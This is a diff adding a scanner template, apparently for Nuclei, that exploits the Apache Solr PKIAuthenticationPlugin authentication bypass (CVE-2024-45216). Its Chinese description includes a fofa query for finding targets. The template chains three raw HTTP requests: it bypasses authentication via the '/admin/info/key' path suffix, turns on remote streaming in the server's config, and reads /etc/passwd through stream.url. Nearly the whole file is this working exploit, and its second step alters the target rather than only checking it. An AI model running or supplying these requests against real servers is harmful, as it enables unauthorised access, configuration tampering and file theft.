@@ -1,0 +1,53 @@
+id: Apache-Solr-Authentication-bypass-File-reading-CVE-2024-45216
+
+info:
+  name: "Apache Solr PKIAuthenticationPlugin 身份验证绕过与敏感数据泄露漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="APACHE-Solr"
+    Apache Solr 的 PKIAuthenticationPlugin 在启用身份验证时默认激活，存在身份验证绕过缺陷。攻击者可通过向 API 请求路径追加 '/admin/info/key' 实现未授权访问，从而泄露敏感数据或执行非授权操作。该漏洞的技术细节及利用方法已公开，鉴于其潜在影响范围广泛，建议受影响用户立即进行漏洞评估并部署缓解措施。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247489096&idx=1&sn=fa062cb988784a6a92f96fa06f98df57&chksm=c267a37bf5102a6dba0ea20cbbda12bb1b21c8a4c61343c59f0b43cbd7ec5c16048c700dcf03&token=824558965&lang=zh_CN#rd
+  tags: Apache
+
+
+http:
+- raw:
+  - |
+    GET /solr/admin/cores:/admin/info/key?indexInfo=false&wt=json HTTP/1.1
+    Host: {{Hostname}}
+    SolrAuth: test
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+  - |
+    POST /solr/{{corsname}}/config:/admin/info/key HTTP/1.1
+    Host: {{Hostname}}
+    SolrAuth: test
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+    Content-Type: application/json
+
+    {"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
+  - |
+    GET /solr/{{corsname}}/debug/dump:/admin/info/key?param=ContentStreams&stream.url=file:///etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+    SolrAuth: test
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+  extractors:
+  - type: regex
+    part: body
+    name: corsname
+    group: 1
+    regex:
+    - '"name":"([^"]+)"'
+    internal: true
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - "root:"
+    - "/bin/bash"
+    condition: and
+  - type: status
+    status:
+    - 200
